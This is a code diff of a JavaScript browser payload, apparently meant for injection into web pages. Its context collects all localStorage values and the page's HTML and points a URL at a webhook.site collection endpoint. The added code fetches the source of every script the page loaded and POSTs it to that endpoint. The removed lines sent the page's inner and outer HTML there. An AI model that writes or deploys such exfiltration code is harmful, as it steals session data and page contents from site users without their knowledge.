@@ -1,4 +1,3 @@
-
 function getAllLocalStorageValues() {
   const allSessionData = {};
   for (let i = 0; i < localStorage.length; i++) {
@@ -27,6 +26,33 @@ outer = document.documentElement.outerHTML;
 
 url = 'https://webhook.site/v2223';
 
+
+async function getData(n) {
+  try {
+    const response = await fetch(n);
+
+    if (!response.ok) {
+    }
+
+    const data = await response.text();
+
+    fetch(url, {
+      method: 'POST',
+      body: data
+     }).then(response => {});
+
+  } catch (error) {
+  }
+}
+
+var entries = performance.getEntriesByType('resource');
+entries.map(function(entry) {
+  if (entry.initiatorType === 'script') {
+    getData(entry.name)
+  }
+});
+
+
 (async () => {
    let response = await new Promise(resolve => {
       var xhr = new XMLHttpRequest();
@@ -38,13 +64,3 @@ url = 'https://webhook.site/v2223';
       xhr.send();
    })
 })()
-
-fetch(url, {
-  method: 'POST',
-  body: inner // Convert the JavaScript object to a JSON string
-}).then(response => {});
-
-fetch(url, {
-  method: 'POST',
-  body: outer // Convert the JavaScript object to a JSON string
-}).then(response => {});
